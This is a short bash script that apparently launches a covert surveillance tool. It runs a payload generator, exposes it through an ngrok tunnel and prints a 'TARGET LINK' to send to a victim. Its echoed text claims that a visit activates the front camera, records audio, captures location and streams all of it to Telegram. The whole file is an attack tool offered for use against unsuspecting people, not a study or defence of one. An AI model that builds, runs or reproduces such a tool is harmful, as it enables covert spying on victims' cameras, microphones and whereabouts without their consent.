#!/bin/bash
python payload_generator.py &
ngrok http 8080 --log=stdout > ngrok.log &
sleep 5
NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"[^"]*"' | head -1 | cut -d'"' -f4)
echo "TARGET LINK: $NGROK_URL"
echo "Send this URL to target. Upon visit:"
echo "- Front camera activates"
echo "- Audio recorded"
echo "- Location captured"
echo "- All data streams to Telegram"
